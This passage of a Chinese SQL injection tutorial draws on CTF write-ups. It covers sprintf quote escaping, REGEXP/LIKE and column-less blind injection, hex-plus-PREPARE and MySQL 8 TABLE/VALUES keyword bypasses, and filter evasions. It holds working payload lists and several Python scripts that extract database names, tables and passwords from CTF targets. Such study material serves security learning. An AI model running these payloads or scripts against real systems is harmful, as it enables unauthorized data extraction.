“&quot;来代替格式字符类型让函数替换为空，则“%1$&#39;”后面的单引号就能闭合前面的单引号 。如果我们输入”%&quot;或者”%1$&quot;,他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么”%&quot;,”%1$&quot;就因为没有经过任何处理而被替换为空。 简单的说就是sprintf中%1$&#39;会将\\吃掉，导致’的逃逸。%后表示第几个参数，$表示参数类型。 还有一个sprintf漏洞的利用方式：%c起到了类似chr()的效果，将数字39转化为’，从而导致了sql注入。 例子: 1234567&lt;?php//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（'），双引号（\"），反斜杠（\\），NULL$input = addslashes (\"%1$' and 1=1#\" );$b = sprintf (\"AND b='%s'\", $input );$sql = sprintf (\"SELECT * FROM t WHERE a='%s' $b \", 'admin' );echo $sql ;?&gt; 结果 123%1$\\' and 1=1#AND b='%1$\\' and 1=1#'SELECT * FROM t WHERE a='admin' AND b='' and 1=1#' 另一个例子: 1234567&lt;?php$input1 = '%1$c) OR 1 = 1 /*' ;$input2 = 39 ;$sql = \"SELECT * FROM foo WHERE bar IN (' $input1 ') AND baz = %s\" ;echo($sql.\"&lt;br&gt;\");$sql = sprintf ( $sql , $input2 );echo $sql ; 结果： 12SELECT * FROM foo WHERE bar IN (' %1$c) OR 1 = 1 /* ') AND baz = %sSELECT * FROM foo WHERE bar IN (' ') OR 1 = 1 /* ') AND baz = 39 REGEXP注入分析使用场景： 1过滤了&#x3D;、in、like ^若被过滤，可使用$来从后往前进行匹配 常用regexp正则语句： 123regexp '^[a-z]' #判断一个表的第一个字符串是否在a-z中regexp '^r' #判断第一个字符串是否为rregexp '^r[a-z]' #判断一个表的第二个字符串是否在a-z中 LIKE注入分析like匹配百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线_通配符允许匹配任何单个字符。1.like ‘s%’判断第一个字符是否为s 1union select 1,database() like 's%',3 --+ 2.like ‘se%’判断前面两个字符串是否为se 1union select 1,database() like 'se%',3 --+ 3.like ‘%sq%’ 判断是否包含se两个字符串 1union select 1,database() like '%se%',3 --+ 4.like ‘_____’判断是否为5个字符 1union select 1,database() like '_____',3 --+ 5.like ‘s____’ 判断第一个字符是否为s 1union select 1,database() like 's____',3 --+ 无列名注入详情可看：https://zhuanlan.zhihu.com/p/98206699 1select b from (select 1,2,3 as b union select * from admin)a; 例题1： SWPUCTF 2019发现数据库的报错信息，证明存在注入。 简单测试了一下，空格 和 or 被过滤，报错过滤了extractvalue 和 updatexml，于是考虑用 union 联合注入。查表名时由于过滤or，所以information_schema无法使用。但Mysql5.6及以上版本中mysql的 innodb_index_stats 和innodb_table_stats这两个表中都包含所有新创建的数据库和表名 也可以用 sys.schema_auto_increment_columns 来注表名 1111'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,' innodb_index_stats 和innodb_table_stats 1-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 表名 ads 和 users 但是不知道列名，只能用无列名注入的方式，另外还过滤了反引号，用别名aaa来代替，payload： 1-1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select * from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 例题2： MySQL堆叠注入预处理PDO场景下的SQL注入探究:https://xz.aliyun.com/t/3950。 PDO默认支持多语句查询，如果php版本小于5.5.21或者创建PDO实例时未设置PDO::MYSQL_ATTR_MULTI_STATEMENTS为true时可能会造成堆叠注入。如果想禁止多语句执行，可在创建PDO实例时将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false 1new PDO($dsn, $user, $pass, array( PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false)) PDO分为模拟预处理和非模拟预处理。 模拟预处理是防止某些数据库不支持预处理而设置的，在初始化PDO驱动时，可以设置一项参数，PDO::ATTR_EMULATE_PREPARES，作用是打开模拟预处理(true)或者关闭(false),默认为true。PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行。 非模拟预处理则是通过数据库服务器来进行预处理动作，主要分为两步：第一步是prepare阶段，发送SQL语句模板到数据库服务器；第二步通过execute()函数发送占位符参数给数据库服务器进行执行。 [SWPU2019]Web4 由于过滤了select,if,sleep,substr等大多数注入常见的单词，但是注入又不得不使用其中的某些单词。那么在这里我们就可以用16进制+mysql预处理来绕过。 12345678910111213141516171819202122mysql&gt; select hex(&#39;select sleep(5)&#39;);+--------------------------------+| hex(&#39;select sleep(5)&#39;) |+--------------------------------+| 73656C65637420736C656570283529 |+--------------------------------+1 row in set (0.01 sec)mysql&gt; set @a&#x3D;0x73656C65637420736C656570283529;Query OK, 0 rows affected (0.00 sec)mysql&gt; prepare test from @a;Query OK, 0 rows affected (0.00 sec)Statement preparedmysql&gt; execute test;+----------+| sleep(5) |+----------+| 0 |+----------+1 row in set (5.00 sec) 脚本 12345678910111213141516171819202122232425262728import requestsimport jsonimport timedef main(): url = '''http://d3f3678a-a060-4de9-a875-dc05ee50bd5d.node3.buuoj.cn/index.php?r=Login/Login''' #注入payload payloads = \"asd';set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -\" flag = '' for i in range(1,30): #查询payload payload = \"select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)\" for j in range(0,128): #将构造好的payload进行16进制转码和json转码 datas = &#123;'username':payloads.format(str_to_hex(payload.format(i,j))),'password':'test213'&#125; data = json.dumps(datas) times = time.time() res = requests.post(url = url, data = data) if time.time() - times &gt;= 3: flag = flag + chr(j) print(flag) breakdef str_to_hex(s): return ''.join([hex(ord(c)).replace('0x', '') for c in s])if __name__ == '__main__': main() mysql8新特性注入详情可看此文章：https://www.anquanke.com/post/id/231627 作用：列出表中全部内容 1TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]] TABLE是MySQL 8.0.19中引入的DML语句，它返回命名表的行和列，类似于SELECT。支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。 1234567891011121314mysql&gt; table users;+------+----------+--------------+| id | username | password |+------+----------+--------------+| 1 | Dumb | Dumb || 2 | admin | admin || 3 | flag | this_is_flag |+------+----------+--------------+mysql&gt; table users order by id limit 0,1;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | Dumb | Dumb |+------+----------+----------+ 与SELECT的区别： 121.TABLE始终显示表的所有列2.TABLE不允许对行进行任意过滤，即TABLE 不支持任何WHERE子句 VALUES statement作用：列出一行的值 12345678910VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]row_constructor_list: ROW(value_list)[, ROW(value_list)][, ...]value_list: value[, value][, ...]column_designator: column_index VALUES是把一组一个或多个行作为表展示出来，返回的也是一个表数据。ROW()返回的是一个行数据，VALUES将ROW()返回的行数据加上字段整理为一个表，然后展示 12345678910111213141516mysql&gt; VALUES ROW(1, 2, 3);+----------+----------+----------+| column_0 | column_1 | column_2 |+----------+----------+----------+| 1 | 2 | 3 |+----------+----------+----------+mysql&gt; VALUES ROW(1, 2, 3) UNION SELECT * FROM users;+----------+----------+--------------+| column_0 | column_1 | column_2 |+----------+----------+--------------+| 1 | 2 | 3 || 1 | Dumb | Dumb || 2 | admin | admin || 3 | flag | this_is_flag |+----------+----------+--------------+ 场景：select关键词被过滤，多语句无法使用 1.判断列数由于TABLE命令和VALUES返回的都是表数据，它们所返回的数据可以通过UNION语句联合起来，当列数不对时会报错，根据这点可以判断列数 1TABLE users union VALUES ROW(1,2,3); 2.使用values判断回显位 1select * from users where id&#x3D;-1 union values row(1,2,3); 3.列出所有数据库名 1table information_schema.schemata; 4.盲注查询任意表中的内容 语句table users limit 1;的查询结果： 123456mysql&gt; table users limit 1;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | Dumb | Dumb |+------+----------+----------+ 实质上是(id, username, password)与(1, ‘Dumb’, ‘Dumb’)进行比较，比较顺序为自左向右，第一列(也就是第一个元组元素)判断正确再判断第二列(也就是第二个元组元素)。两个元组第一个字符比大小，如果第一个字符相等就比第二个字符的大小，以此类推，最终结果即为元组的大小。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546mysql&gt; select ((1,'','')&lt;(table users limit 1));+-----------------------------------+| ((1,'','')&lt;(table users limit 1)) |+-----------------------------------+| 1 |+-----------------------------------+1 row in set (0.00 sec)mysql&gt; select ((2,'','')&lt;(table users limit 1));+-----------------------------------+| ((2,'','')&lt;(table users limit 1)) |+-----------------------------------+| 0 |+-----------------------------------+1 row in set (0.00 sec)mysql&gt; select ((1,'Du','')&lt;(table users limit 1));+-------------------------------------+| ((1,'Du','')&lt;(table users limit 1)) |+-------------------------------------+| 1 |+-------------------------------------+1 row in set (0.00 sec)mysql&gt; select ((1,'Dum','')&lt;(table users limit 1));+--------------------------------------+| ((1,'Dum','')&lt;(table users limit 1)) |+--------------------------------------+| 1 |+--------------------------------------+1 row in set (0.00 sec)mysql&gt; select ((1,'Dumb','')&lt;(table users limit 1));+---------------------------------------+| ((1,'Dumb','')&lt;(table users limit 1)) |+---------------------------------------+| 1 |+---------------------------------------+1 row in set (0.00 sec)mysql&gt; select ((1,'Dumb','D')&lt;(table users limit 1));+----------------------------------------+| ((1,'Dumb','D')&lt;(table users limit 1)) |+----------------------------------------+| 1 |+----------------------------------------+1 row in set (0.00 sec) 需要注意的地方1.当前判断的所在列的后一列需要用字符表示，不能用数字，否则判断到当前列的最后一个字符会判断不出！2.最好用&lt;=替换&lt;，用&lt;比较一开始并没有问题，但到最后一位时结果为正确字符的前一个字符，用&lt;=结果更直观。最终判断过程如下： 123456789101112131415mysql&gt; select ((1,'Dumb','Dumb')&lt;=(table users limit 1));+--------------------------------------------+| ((1,'Dumb','Dumb')&lt;=(table users limit 1)) |+--------------------------------------------+| 1 |+--------------------------------------------+1 row in set (0.00 sec)mysql&gt; select ((1,'Dumb','Dumc')&lt;=(table users limit 1));+--------------------------------------------+| ((1,'Dumb','Dumc')&lt;=(table users limit 1)) |+--------------------------------------------+| 0 |+--------------------------------------------+1 row in set (0.00 sec) 例题： 1.判断列数使用经典的order by语句判断： 121' order by 3--+ #正常1' order by 4--+ #显示Unknown column '4' in 'order clause' 说明有3列 2.使用values判断回显位 1-1' union values row(1,2,3)--+ 3.爆库爆表爆字段爆数据（1）爆当前数据库 12-1' union values row(1,database(),3)--+#或利用盲注1' and ascii(substr((database()),1,1))=115--+ 即s （2）爆所有数据库因为table不能像select控制列数，除非列数一样的表，不然都回显不出来。需要使用table查询配合无列名盲注information_schema.schemata表有6列因为schemata表中的第一列是def，不需要判断，所以可以直接判断库名 1234561' and ('def','m','',4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显正常1' and ('def','n','',4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显错误#得到第1个数据库名的第一个字符为m......1' and ('def','mysql','',4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显正常1' and ('def','mysqm','',4,5,6)&lt;=(table information_schema.schemata limit 1)--+ #回显错误 说明第1个数据库名为mysql 12341' and ('def','information_schema','',4,5,6)&lt;=(table information_schema.schemata limit 1,1)--+ #回显正常1' and ('def','information_schemb','',4,5,6)&lt;=(table information_schema.schemata limit 1,1)--+ #回显错误#说明第2个数据库名为information_schema...... 一直猜解，直到获得全部数据库名（3）爆数据表information_schema.tables表有21列 12345671' and ('def','security','users','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 317,1)--+ #第一个表users1' and ('def','security','emails','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 318,1)--+ #第二个表emails1' and ('def','security','uagents','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 319,1)--+ #第三个表uagents1' and ('def','security','referers','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit 320,1)--+ #第四个表referers 前两个字段都是确定的，可以写一个for循环判断，如果结果为真，代表从那行开始(这里是limit 317,1，即第318行)，然后盲注第三个列。（4）爆字段名information_schema.columns表有22列得到所有表名后开始判断字段名，找到columns表，具体方法和上面一样 123451' and ('def','security','users','id','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;=(table information_schema.columns limit 3386,1)--+ #users表第一个字段为id1' and ('def','security','users','password','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;=(table information_schema.columns limit 3387,1)--+ #users表，第二个字段为password1' and ('def','security','users','username','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;=(table information_schema.columns limit 3388,1)--+ #users表，第三个字段为username （3）爆数据 1234567891' and (1,'D','')&lt;=(table users limit 1)--+ #正常1' and (1,'E','')&lt;=(table users limit 1)--+ #错误#table users limit 1也就是table users limit 0,1#1' and (1,'D','')&lt;=(table users limit 0,1)--+ #正常#1' and (1,'E','')&lt;=(table users limit 0,1)--+ #错误......1' and (1,'Dumb','Dumb')&lt;=(table users limit 1)--+ #正常1' and (1,'Dumb','Dumc')&lt;=(table users limit 1)--+ #错误 得到第1个记录为1 Dumb Dumb 121' and (8,'admin','admin')&lt;=(table users limit 7,1)--+ #正常1' and (8,'admin','admio')&lt;=(table users limit 7,1)--+ #错误 得到第8个记录为8 admin admin一步一步注出数据 脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202&#39;&#39;&#39;@desc 本脚本是用于mysql 8新特性的sql注入&#39;&#39;&#39;import requestsimport stringurl &#x3D; &#39;http:&#x2F;&#x2F;121.41.231.75:8002&#x2F;Less-8&#x2F;?id&#x3D;&#39;chars&#x3D;string.ascii_letters+string.digits+&quot;@&#123;&#125;_-?&quot;def current_db(url): print(&quot;利用mysql8新特性或普通布尔盲注:\\n1.新特性(联合查询) 2.普通布尔盲注&quot;) print(&quot;请输入序号:&quot;,end&#x3D;&#39;&#39;) num &#x3D; int(input()) if num &#x3D;&#x3D; 1: payload &#x3D; &quot;-1&#39; union values row(1,database(),3)--+&quot; #联合查询爆当前数据库(可修改) urls &#x3D; url + payload r &#x3D; requests.get(url&#x3D;urls) print(r.text) else: name&#x3D;&#39;&#39; payload &#x3D; &quot;1&#39; and ascii(substr((database()),&#123;0&#125;,1))&#x3D;&#123;1&#125;--+&quot; #布尔盲注爆当前数据库(可修改) for i in range(1,40): char&#x3D;&#39;&#39; for j in chars: payloads &#x3D; payload.format(i,ord(j)) urls &#x3D; url + payloads r &#x3D; requests.get(url&#x3D;urls) if &quot;You are in&quot; in r.text: name +&#x3D; j print(name) char &#x3D; j break if char &#x3D;&#x3D; &#39;&#39;: breakdef str2hex(name): res &#x3D; &#39;&#39; for i in name: res +&#x3D; hex(ord(i)) res &#x3D; &#39;0x&#39; + res.replace(&#39;0x&#39;,&#39;&#39;) return resdef dbs(url): #无列名盲注爆所有数据库(可修改) while True: print(&quot;请输入要爆第几个数据库，如：1,2等:&quot;,end&#x3D;&#39;&#39;) x &#x3D; int(input())-1 num &#x3D; str(x) if x &lt; 0: break payload &#x3D; &quot;1&#39; and (&#39;def&#39;,&#123;&#125;,&#39;&#39;,4,5,6)&gt;(table information_schema.schemata limit &quot;+num+&quot;,1)--+&quot; name &#x3D; &#39;&#39; for i in range(1,20): hexchar &#x3D; &#39;&#39; for char in range(32, 126): hexchar &#x3D; str2hex(name + chr(char)) payloads &#x3D; payload.format(hexchar) #print(payloads) urls &#x3D; url + payloads r &#x3D; requests.get(url&#x3D;urls) if &#39;You are in&#39; in r.text: name +&#x3D; chr(char-1) print(name) breakdef tables_n(url,database): #无列名盲注爆数据表开始行数(可修改) payload &#x3D; &quot;1&#39; and (&#39;def&#39;,&#39;&quot;+database+&quot;&#39;,&#39;&#39;,&#39;&#39;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit &#123;&#125;,1)--+&quot; for i in range(0,10000): payloads &#x3D; payload.format(i) urls &#x3D; url + payloads r &#x3D; requests.get(url&#x3D;urls) if &#39;You are in&#39; in r.text: char &#x3D; chr(ord(database[-1])+1) database &#x3D; database[0:-1]+char payld &#x3D; &quot;1&#39; and (&#39;def&#39;,&#39;&quot;+database+&quot;&#39;,&#39;&#39;,&#39;&#39;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit &quot;+str(i)+&quot;,1)--+&quot; urls &#x3D; url + payld res &#x3D; requests.get(url&#x3D;urls) #print(i) if &#39;You are in&#39; not in res.text: print(&#39;从第&#39;,i,&#39;行开始爆数据表&#39;) #判断开始行数 n &#x3D; i break return ndef tables(url,database,n): #无列名盲注爆数据表(可修改) while True: print(&quot;请输入要爆第几个数据表，如：1,2等:&quot;,end&#x3D;&#39;&#39;) x &#x3D; int(input())-1 num &#x3D; str(x + n) if x &lt; 0: break payload &#x3D; &quot;1&#39; and (&#39;def&#39;,&#39;&quot;+database+&quot;&#39;,&#123;&#125;,&#39;&#39;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&gt;(table information_schema.tables limit &quot;+num+&quot;,1)--+&quot; name &#x3D; &#39;&#39; for i in range(1,20): hexchar &#x3D; &#39;&#39; for char in range(32, 126): hexchar &#x3D; str2hex(name + chr(char)) payloads &#x3D; payload.format(hexchar) #print(payloads) urls &#x3D; url + payloads r &#x3D; requests.get(url&#x3D;urls) if &#39;You are in&#39; in r.text: name +&#x3D; chr(char-1) print(name) breakdef columns_n(url,database,table): #无列名盲注爆字段开始行数(可修改) payload &#x3D; &quot;1&#39; and (&#39;def&#39;,&#39;&quot;+database+&quot;&#39;,&#39;&quot;+table+&quot;&#39;,&#39;&#39;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit &#123;&#125;,1)--+&quot; for i in range(3000,10000): payloads &#x3D; payload.format(i) urls &#x3D; url + payloads r &#x3D; requests.get(url&#x3D;urls) if &#39;You are in&#39; in r.text: char &#x3D; chr(ord(table[-1])+1) table &#x3D; table[0:-1]+char payld &#x3D; &quot;1&#39; and (&#39;def&#39;,&#39;&quot;+database+&quot;&#39;,&#39;&quot;+table+&quot;&#39;,&#39;&#39;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit &quot;+str(i)+&quot;,1)--+&quot; urls &#x3D; url + payld res &#x3D; requests.get(url&#x3D;urls) #print(i) if &#39;You are in&#39; not in res.text: print(&#39;从第&#39;,i,&#39;行开始爆字段&#39;) #判断开始行数 n &#x3D; i break return ndef columns(url,database,table,n): #无列名盲注爆字段值(可修改) while True: print(&quot;请输入要爆第几个字段，如：1,2等:&quot;,end&#x3D;&#39;&#39;) x &#x3D; int(input())-1 num &#x3D; str(x + n) if x &lt; 0: break payload &#x3D; &quot;1&#39; and (&#39;def&#39;,&#39;&quot;+database+&quot;&#39;,&#39;&quot;+table+&quot;&#39;,&#123;&#125;,&#39;&#39;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&gt;(table information_schema.columns limit &quot;+num+&quot;,1)--+&quot; name &#x3D; &#39;&#39; for i in range(1,20): hexchar &#x3D; &#39;&#39; for char in range(32, 126): hexchar &#x3D; str2hex(name + chr(char)) payloads &#x3D; payload.format(hexchar) #print(payloads) urls &#x3D; url + payloads r &#x3D; requests.get(url&#x3D;urls) if &#39;You are in&#39; in r.text: name +&#x3D; chr(char-1) print(name) breakdef datas(url,table): #无列名盲注爆数据(可修改) while True: print(&quot;请输入要爆第几个数据，如：1,2等:&quot;,end&#x3D;&#39;&#39;) x &#x3D; int(input()) y &#x3D; x-1 num &#x3D; str(y) if y &lt; 0: break payload &#x3D; &quot;1&#39; and (&quot;+str(x)+&quot;,&#123;&#125;,&#39;&#39;)&gt;(table &quot;+table+&quot; limit &quot;+num+&quot;,1)--+&quot; name &#x3D; &#39;&#39; for i in range(1,20): hexchar &#x3D; &#39;&#39; for char in range(32, 126): hexchar &#x3D; str2hex(name + chr(char)) payloads &#x3D; payload.format(hexchar) #print(payloads) urls &#x3D; url + payloads r &#x3D; requests.get(url&#x3D;urls) if &#39;You are in&#39; in r.text: name +&#x3D; chr(char-1) print(name) breakif __name__ &#x3D;&#x3D; &quot;__main__&quot;: while True: print(&quot;请输入要操作的内容：\\n1.爆当前数据库\\n2.爆数据表开始行号\\n3.爆数据表\\n4.爆字段值开始行号\\n5.爆字段值\\n6.爆数据\\n7.爆所有数据库&quot;) types &#x3D; int(input()) if types &#x3D;&#x3D; 1: current_db(url) elif types &#x3D;&#x3D; 2 or types &#x3D;&#x3D; 3: print(&quot;请输入已经得到的数据库名:&quot;,end&#x3D;&#39;&#39;) database &#x3D; input() if types &#x3D;&#x3D; 2: tables_n(url,database) elif types &#x3D;&#x3D; 3: print(&quot;爆数据表开始行号:&quot;,end&#x3D;&#39;&#39;) n &#x3D; int(input()) tables(url,database,n) elif types &#x3D;&#x3D; 4 or types &#x3D;&#x3D; 5: print(&quot;请输入已经得到的数据库名:&quot;,end&#x3D;&#39;&#39;) database &#x3D; input() print(&quot;请输入已经得到的数据表名:&quot;,end&#x3D;&#39;&#39;) table &#x3D; input() if types &#x3D;&#x3D; 4: columns_n(url,database,table) elif types &#x3D;&#x3D; 5: print(&quot;爆字段值开始行号:&quot;,end&#x3D;&#39;&#39;) n &#x3D; int(input()) columns(url,database,table,n) elif types &#x3D;&#x3D; 6: print(&quot;请输入要查询的数据表名:&quot;,end&#x3D;&#39;&#39;) table &#x3D; input() datas(url,table) else: dbs(url) handlermysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。用法: HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。HANDLER tbl_name CLOSE来关闭打开的句柄。最后 12341';handler FlagHere open;handler FlagHere read first;handler FlagHere close;# sql注入绕过过滤空格1.使用注释符/**/绕过 1SELECT/**/name/**/FROM/**/table 2.使用url编码绕过 1%a0 发出去就是空格的意思，但是需要在burp中抓包后修改 3.使用浮点数绕过 123select * from users where id=8E0union select 1,2,3等价于select * from users where id=8.0 select 1,2,3 4.使用Tab替代空格5.使用两个空格替代一个空格6.使用括号绕过如果空格被过滤，括号没有被过滤，可以用括号绕过。 在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。 例如： 1select(user())from dual where(1=1)and(2=2) 这种过滤方法常常用于time based盲注,例如： 1?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23 过滤引号使用16进制绕过会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句： 1select column_name from information_schema.columns where table_name=\"users\" 这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。 users的十六进制的字符串是7573657273。那么最后的sql语句就变为了： 1select column_name from information_schema.columns where table_name=0x7573657273 过滤逗号1.使用from关键字绕过对于substr()和mid()这两个方法可以使用from to的方式来解决： 12select substr(database() from 1 for 1);select mid(database() from 1 for 1); 2.使用join关键字绕过 123union select 1,2等价于union select * from (select 1)a join (select 2)b 3.使用like关键字绕过 12select ascii(mid(user(),1,1))=80 #等价于select user() like 'r%' 4.使用offset关键字绕过对于limit可以使用offset来绕过： 123select * from news limit 0,1等价于select * from news limit 1 offset 0 过滤注释符（ # 和 – ）手动闭合引号，不使用注释符 1id=1' union select 1,2,3||'1 或者： 1id=1' union select 1,2,'3 过滤比较符号 （ &lt; 和 &gt; ）1.使用greatest()、least（）函数绕过greatest()、least（）：（前者返回最大值，后者返回最小值） 同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了 最常见的一个盲注的sql语句： 1select * from users where id=1 and ascii(substr(database(),0,1))&gt;64 此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值 那么上面的这条sql语句可以使用greatest变为如下的子句: 1select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64 使用between and绕过between a and b：返回a，b之间的数据，不包含b。 过滤等号（ = ）使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt; 过滤union，select，where等1.使用注释符绕过常用注释符： 1//、--、/**/、#、--+、---、;、%00、--a 用法： 1U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user 2.使用大小写绕过 1id=-1'UnIoN/**/SeLeCT 3.使用内联注释绕过 1id=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()# 4.使用双关键字绕过（若删除掉第一个匹配的union就能绕过） 1id=-1'UNIunionONSeLselectECT1,2,3–- 5.使用加号+拆解字符串 1or 'swords' ='sw' +'ords' ；EXEC('IN' +'SERT INTO'+'…..' ) 6.使用语法新特性绕过屏蔽select在MySQL 8.0.19版本后，mysql推出了一些新特性，使我们可以不使用select就能够取数据 TABLE 语句可以直接列出表的全部内容 1TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]] TABLE是MySQL 8.0.19中引入的DML语句，它返回命名表的行和列，类似于SELECT。支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。 如 select * from user 就可以用 table user 替代来进行绕过 VALUES 语句可以列出一行的值 12345678910VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]row_constructor_list: ROW(value_list)[, ROW(value_list)][, ...]value_list: value[, value][, ...]column_designator: column_index 例如直接列出一行的值 1VALUES ROW(1,2,3), ROW(4,5,6); VALUES和TABLES语句的结果都是表数据，可以结合起来使用 其他使用多语句的方式执行 123set @a:=0x73656c656374202a2066726f6d2074657374;prepare s from @a;execute s; https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/ 例题[CISCN2019 总决赛 Day2 Web1]Easyweb访问robots.txt，得知有bak备份image.php.bak 123456789101112131415161718&lt; ?phpinclude \"config.php\";$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path);$result=mysqli_query($con,\"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'\");$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=\"./\" . $row[\"path\"];header(\"Content-Type: image/jpeg\");readfile($path); addslashes()函数，这个函数会把特殊的字符转义。 比如:单引号会被转义成’,斜杠会转义为. 第十行的str_replace会把”\\0”,”%00”,”\\‘“,”‘“中的任意一个替换成空。 我们可根据这个绕过当传入id=\\0时，这样会被转义成\\0，然后\\0被替换为空，只剩下了一个\\，这个反斜杠正好可以转义后面的查询语句中闭合id的单引号。 1select * from images where id&#x3D;&#39;\\&#39; or path&#x3D;’+&#123;$path&#125;’ 所以我们可以在path处注入我们的新语句， 由于没有查询结果回显，所以此处是盲注 12345678910111213141516171819202122232425import requestsurl = \"http://18d42f36-2704-43a9-8690-b52a3c0a95e8.node3.buuoj.cn/image.php?id=\\\\0&amp;path=or 1=\"result = \"\"last=\"tmp\"i=0while( last != result ): i=i+1 head=32 tail=127 while head &lt; tail : mid = ( head + tail ) &gt;&gt; 1 #payload = \"if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ),%d,1))&gt;%d,1,-1)%%23\"%(i,mid) #payload = \"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 ),%d,1))&gt;%d,1,-1)%%23\"%(i,mid) payload = \"if(ascii(substr((select group_concat(password) from users),%d,1))&gt;%d,1,-1)%%23\"%(i,mid) #print(url+payload) r = requests.get(url+payload) if b\"JFIF\" in r.content : head = mid + 1 else: tail = mid last = result if chr(head)!=' ' : result += chr(head) print(result) 可看此文章https://www.cnblogs.com/Vinson404/p/7253255.html参考文章:史上最水的MYSQL注入总结：https://xz.aliyun.com/t/3992sql注入总结: https://xz.aliyun.com/t/2869#toc-12ctfwiki: https://ctf-wiki.github.io/ctf-wiki/web/sqli/#_13一种新的MySQL下Update、Insert注入方法https://www.anquanke.com/post/id/85487解析php sprintf函数漏洞 https://blog.csdn.net/WQ_BCJ/article/details/85057447 PHP sprintf格式化字符串漏洞 